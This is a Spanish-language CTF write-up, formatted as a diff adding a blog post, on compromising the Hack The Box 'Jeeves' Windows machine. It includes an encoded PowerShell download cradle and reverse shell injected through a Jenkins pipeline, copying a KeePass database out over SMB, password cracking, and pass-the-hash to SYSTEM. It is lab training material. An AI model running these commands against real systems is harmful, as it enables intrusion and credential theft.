@@ -1,0 +1,212 @@
+---
+title: 'CTF - Jeeves WriteUp'
+date: '2022-02-12'
+tags: ["CTF", "Windows", "PassTheHash", "#Import 2022-12-20 21:06"]
+draft: false
+authors: ['default']
+summary: Escaneamos puertos con NMAP y ejecutamos un análisis más exhaustivo sobre los puertos abiertos Omit
+---
+
+Escaneamos puertos con NMAP y ejecutamos un análisis más exhaustivo sobre los puertos abiertos. Omitiré la información no relevante.
+
+
+```
+nmap -p80,135,445,50000 -vvv -sCV -n -Pn 10.10.10.63 -oG targeted
+PORT      STATE SERVICE      REASON          VERSION
+80/tcp    open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
+|_http-title: Ask Jeeves
+|_http-server-header: Microsoft-IIS/10.0
+445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+50000/tcp open  http         syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT
+|_http-title: Error 404 Not Found
+|_http-server-header: Jetty(9.4.z-SNAPSHOT)
+Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2022-02-12T22:04:41
+|_  start_date: 2022-02-12T21:50:58
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+```
+Lo primero que observamos es que la firma de smb no es necesaria. A continuación, lo validamos con *crackmapexec*.
+
+
+```
+❯ crackmapexec smb 10.10.10.63
+SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
+```
+Estamos ante una máquina Win10 x64 y SMB no está firmado. Esto lo hace potencialmente vulnerable a un ataque de tipo PassTheHash. Continuamos investigando. Entrando en la web y aparece la siguiente imagen.
+
+![](https://blog.ikerocio.com/content/images/2022/02/image-17.png)Cuando buscas algo, siempre sale la misma ventana de error que no es un error como tal, es un archivo png. No parece que se esté ejecutando nada.
+
+Aplico Fuzzing contra el puerto 80 y el puerto 50000. En este segundo puerto, parece que encuentro una ruta disponible en */askjeeves*.
+
+
+```
+❯ wfuzz -c --hc=404 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt "http://10.10.10.63:50000/FUZZ"
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+Target: http://10.10.10.63:50000/FUZZ
+Total requests: 220560
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload 
+=====================================================================
+000041607:   302        0 L      0 W        0 Ch        "askjeeves"
+```
+Accedo a la URL y encuentro un Jenkins de v2.87.
+
+![](https://blog.ikerocio.com/content/images/2022/02/image-18.png)Encontramos una [vulnerabilidad](https://cxsecurity.com/issue/WLB-2019020120) con el pipeline de Jenkins para esa versión. Hacemos una prueba rápida colocando un comando en la ventana de configuración del pipeline.
+
+![](https://blog.ikerocio.com/content/images/2022/02/image-19.png)*Es importante seleccionar el Sandbox de Groovy que es quien tiene la vulnerabilidad*.
+
+Ponemos en escucha *tcpdump* y vemos si hay respuesta cuando ejecutamos el pipeline.
+
+![](https://blog.ikerocio.com/content/images/2022/02/image-20.png)Se acontece la vulnerabilidad. Modificamos el script de arriba para que nos entable una reverse shell.
+
+Para ello, vamos a enviar a la consola de Powershell un código codificado en base64. El código en cuestión es el siguiente.
+
+
+```
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21/PS.ps1')
+```
+Esto descargará un script desde nuestro equipo y lo ejecutará en el entorno remoto. Dicho script contiene una reverse shell descargada del repositorio de [Nishang](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1) que modificaremos a nuestro gusto.
+
+La forma de codificarlo a base64 pasa por cambiar el encoding a UTF-16LE si queremos tener en consideración a [Microsoft](https://docs.microsoft.com/es-es/powershell/module/microsoft.powershell.core/about/about_character_encoding?view=powershell-7.2). De lo contrario, probablemente no podrá ejecutar nuestro comando.
+
+
+ En general, Windows PowerShell tiene configurada la codificación UNICODE [UTF-16LE](https://wikipedia.org/wiki/UTF-16) de forma predeterminada.
+
+Para ello, ejecutamos el siguiente código.
+
+
+```
+❯ echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21/PS.ps1')"data
+❯ cat data | iconv -t utf-16le | xxd
+00000000: 4900 4500 5800 2800 4e00 6500 7700 2d00  I.E.X.(.N.e.w.-.
+00000010: 4f00 6200 6a00 6500 6300 7400 2000 4e00  O.b.j.e.c.t. .N.
+00000020: 6500 7400 2e00 5700 6500 6200 4300 6c00  e.t...W.e.b.C.l.
+00000030: 6900 6500 6e00 7400 2900 2e00 6400 6f00  i.e.n.t.)...d.o.
+00000040: 7700 6e00 6c00 6f00 6100 6400 5300 7400  w.n.l.o.a.d.S.t.
+00000050: 7200 6900 6e00 6700 2800 2700 6800 7400  r.i.n.g.(.'.h.t.
+00000060: 7400 7000 3a00 2f00 2f00 3100 3000 2e00  t.p.:././.1.0...
+00000070: 3100 3000 2e00 3100 3400 2e00 3200 3100  1.0...1.4...2.1.
+00000080: 2f00 5000 5300 2e00 7000 7300 3100 2700  /.P.S...p.s.1.'.
+00000090: 2900 0a00                                )...
+❯ cat data | iconv -t utf-16le | base64 -w0; echo
+SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMQAvAFAAUwAuAHAAcwAxACcAKQAKAA==powershell
+```
+Copiamos el código final en base64 y lo adjuntamos a nuestro exploit del pipeline de Jenkins.
+
+
+```
+node {
+   powershell 'powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMQAvAFAAUwAuAHAAcwAxACcAKQAKAA=='
+}
+```
+Ponemos un servidor en nuestro equipo que acepte la descarga del script y en otra ventana netcat en escucha en el puerto 443.
+
+Ejecutamos el pipeline en Jenkins.
+
+![](https://blog.ikerocio.com/content/images/2022/02/image-21.png)Recibimos la consola de nuestro lado.
+
+
+```
+❯ rlwrap nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.21] from (UNKNOWN) [10.10.10.63] 49685
+Windows PowerShell running as user kohsuke on JEEVES
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Administrator\.jenkins\workspace\test whoami
+jeeves\kohsuke
+PS C:\Users\Administrator\.jenkins\workspace\test cat C:\Users\kohsuke\Desktop\user.txt    
+e323xxxxxxxxxxxxxxxxxxxxxxxxxxx
+```
+Obtenemos la primera flag y continuamos con el escalado de privilegios.
+
+En la carpeta documentos del usuario, descubrimos un archivo kdbx. Esta extensión pertenece a [KeePass](https://www.file-extension.info/es/format/kdbx).
+
+
+```
+PS C:\Users\kohsuke\Documentsls
+CEH.kdbx
+```
+Para descargarnos el archivo a nuestro equipo, montamos un servidor samba.
+
+
+```
+❯ impacket-smbserver smbFolder $(pwd) -smb2support
+```
+Y nos copiamos el archivo directamente en nuestro equipo.
+
+
+```
+PS C:\Users\kohsuke\Documentscopy CEH.kdbx \\10.10.14.21\smbFolder\CEH.kdbx
+```
+Primero obtenemos el hash de la contraseña con *keepass2john*, ejecutamos *[John The Ripper](https://www.openwall.com/john/)* con el diccionario [Rockyou](https://www.quora.com/How-many-passwords-are-in-rockyou-txt#:~:text=The%20rockyou.txt%20that%20comes,2020.2a%20contains%2014%2C442%2C063%20words.) que contiene más de 14 millones de las contraseñas más utilizadas y mostramos los resultados.
+
+
+```
+❯ keepass2john CEH.kdbx  hash
+❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+❯ john -show hash
+CEH:mooxxxxx
+```
+Parece que los resultados han sido positivos. Usamos la contraseña para abrir el archivo *kdbx* en un cliente de KeePass como [KeePassXC](https://keepassxc.org/).
+
+![](https://blog.ikerocio.com/content/images/2022/02/image-22.png)La entrada seleccionada en la imagen contiene una contraseña que parece ser un hash [NTLM](https://security.stackexchange.com/questions/161889/understanding-windows-local-password-hashes-ntlm) del usuario administrador. Validamos el hash con *crackmapexec*.
+
+
+```
+❯ crackmapexec smb 10.10.10.63 -u "Administrator" -H "e0fbxxxxxxxxxxxxxxxxxxx"
+SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
+SMB         10.10.10.63     445    JEEVES           [+] Jeeves\Administrator e0fbxxxxxxxxxxxxxxxx (Pwn3d!)
+```
+**Como aparece la palabra (Pwn3d!), confirmamos que el hash es correcto.**
+
+A continuación, ejecutamos *psexec.py* para entablar una shell.
+
+
+```
+❯ psexec.py WORKGROUP/administrator@10.10.10.63 -hashes :e0fbxxxxxxxxxxxxxxxxxxxxxx
+Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
+
+...
+Microsoft Windows [Version 10.0.10586]
+(c) 2015 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32 whoami
+nt authority\system
+```
+Estamos dentro como usuario Administrator y buscamos la flag.
+
+En el escritorio encontramos un archivo que nos dice que lo que buscamos está en algún otro sitio más profundo.
+
+
+```
+C:\Users\Administrator\Desktop type hm.txt
+The flag is elsewhere.  Look deeper.
+```
+NTFS tiene la posibilidad de almacenar la información en distintos streams de datos. Se puede encontrar más información [aquí](https://www.deepinstinct.com/blog/the-abuse-of-alternate-data-stream-hasnt-disappeared). Para enumerar todos los archivos/streams de archivos se emplea el parámetro /r.
+
+Después, invocamos el comando [more](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/more) de Powershell para ver el siguiente stream de información. 
+
+
+```
+C:\Users\Administrator\Desktop dir /r
+ Directory of C:\Users\Administrator\Desktop
+
+11/08/2017  09:05 AM     .
+11/08/2017 09:05 AM  ..
+12/24/2017 02:51 AM 36 hm.txt
+ 34 hm.txt:root.txt:$DATA
+
+C:\Users\Administrator\Desktop more  hm.txt:root.txt
+afbcxxxxxxxxxxxxxx
+```
